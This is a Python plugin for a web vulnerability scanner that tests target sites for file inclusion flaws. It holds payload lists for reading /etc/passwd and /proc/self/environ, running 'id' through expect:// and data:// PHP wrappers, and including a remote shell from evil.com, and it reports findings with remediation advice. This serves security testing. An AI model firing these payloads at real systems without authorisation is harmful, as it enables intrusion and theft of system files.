"""LFI/RFI detection — Local and Remote File Inclusion."""

from __future__ import annotations

import contextlib
import logging
from collections.abc import AsyncIterator
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlparse

from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Finding, Severity

if TYPE_CHECKING:
    from marlonthebug.core.workspace import TargetInfo, Workspace

logger = logging.getLogger("marlonthebug.plugins.web.lfi_rfi")

LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=index",
    "/proc/self/environ",
    "expect://id",
    "data://text/plain,<?php system('id'); ?>",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://pastebin.com/raw/evil",
]

PHP_ERRORS = [
    r"(?i)include\(\)",
    r"(?i)require\(\)",
    r"(?i)include_once\(\)",
    r"(?i)require_once\(\)",
    r"(?i)failed to open stream",
    r"(?i)No such file or directory",
    r"(?i)failed opening.*for inclusion",
]

FILE_PARAMS = ["file", "page", "include", "path", "template", "view", "load", "module", "content", "lang"]


class LFIRFIAuditor(BasePlugin):
    name = "lfi_rfi"
    version = "1.0.0"
    description = "Detect Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities"
    category = "web"

    async def setup(self, workspace: Workspace) -> None:
        self._workspace = workspace

    async def run(self, target: TargetInfo, options: dict | None = None) -> AsyncIterator[Finding]:
        http = AsyncHTTPClient(timeout=10, retries=1)
        try:
            for scheme in ["https", "http"]:
                try:
                    resp = await http.get(f"{scheme}://{target.host}")
                    base_url = f"{scheme}://{target.host}"
                    break
                except Exception:
                    continue
            else:
                return

            from urllib.parse import urljoin

            from bs4 import BeautifulSoup

            soup = BeautifulSoup(resp.body, "lxml")
            test_urls: set[str] = set()

            for a in soup.find_all("a", href=True):
                href = urljoin(base_url, a["href"])
                parsed = urlparse(href)
                if parsed.netloc in (target.host, f"www.{target.host}"):
                    test_urls.add(href)

            for fp in FILE_PARAMS:
                test_urls.add(f"{base_url}?{fp}=home")

            for url in list(test_urls)[:15]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                for param_name in list(params.keys())[:10]:
                    param_lower = param_name.lower()
                    is_file_param = any(fp in param_lower for fp in FILE_PARAMS)

                    if not is_file_param:
                        continue

                    baseline_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                    baseline_params[param_name] = "nonexistent_file_xyz123"
                    query_str = "&".join(f"{k}={v}" for k, v in baseline_params.items())
                    baseline_url = parsed._replace(query=query_str).geturl()

                    try:
                        baseline = await http.get(baseline_url)
                    except Exception:
                        continue

                    for payload in LFI_PAYLOADS:
                        test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                        test_params[param_name] = payload
                        query_str = "&".join(f"{k}={v}" for k, v in test_params.items())
                        test_url = parsed._replace(query=query_str).geturl()

                        try:
                            response = await http.get(test_url)

                            for indicator in ["root:x:0:0", "daemon:x:", "bin:x:"]:
                                if indicator in response.body:
                                    yield self.create_finding(
                                        title=f"LFI in '{param_name}' — /etc/passwd accessible",
                                        description=f"Local File Inclusion vulnerability in '{param_name}' allows reading sensitive system files.",
                                        severity=Severity.CRITICAL,
                                        cvss_score=9.5,
                                        endpoint=url,
                                        target_host=target.host,
                                        evidence={
                                            "parameter": param_name,
                                            "payload": payload,
                                            "response_snippet": response.body[:300],
                                        },
                                        remediation=(
                                            "1. Use allowlist for file inclusion paths\n"
                                            "2. Disable allow_url_include in PHP\n"
                                            "3. Use basename() to strip path components\n"
                                            "4. Validate input against known safe values\n"
                                            "5. Use class autoloading instead of dynamic includes"
                                        ),
                                    )
                                    break

                            if response.content_length > 100 and baseline.content_length < 50:
                                import re as regex

                                for pattern in PHP_ERRORS:
                                    if regex.search(pattern, response.body):
                                        yield self.create_finding(
                                            title=f"Possible LFI in '{param_name}' (PHP error leak)",
                                            description=f"PHP file inclusion error exposed in parameter '{param_name}'.",
                                            severity=Severity.HIGH,
                                            cvss_score=7.5,
                                            endpoint=url,
                                            target_host=target.host,
                                            evidence={
                                                "parameter": param_name,
                                                "payload": payload,
                                                "error_snippet": response.body[:200],
                                            },
                                        )
                                        break
                        except Exception:
                            pass

                    for rfi_payload in RFI_PAYLOADS[:1]:
                        test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                        test_params[param_name] = rfi_payload
                        query_str = "&".join(f"{k}={v}" for k, v in test_params.items())
                        test_url = parsed._replace(query=query_str).geturl()
                        with contextlib.suppress(Exception):
                            await http.get(test_url)
        finally:
            await http.close()
